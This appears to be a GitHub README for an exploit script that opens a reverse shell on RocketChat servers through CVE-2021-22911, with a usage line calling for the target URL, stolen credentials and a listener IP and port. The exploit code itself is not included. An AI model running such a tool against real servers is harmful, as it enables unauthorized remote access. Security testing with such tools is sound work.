# Authenticated RocketChat 3.12.1 Reverse-Shell - CVE-2021-22911
Authenticated RocketChat 3.12.1 Reverse Shell - CVE-2021-22911

Based On: https://github.com/CsEnox/CVE-2021-22911

Quick exploit to get a reverse shell if credentials were adquired. Tested on RocketChat 2.4.14

<br>

Usage: python3 exploit.py -t \<TARGET URL\> -u \<USERNAME\> -p \<PASSWORD\> -i \<LOCAL IP\> -l \<LOCAL PORT\>
  
Requirements: This exploit uses pwntools > pip install pwn
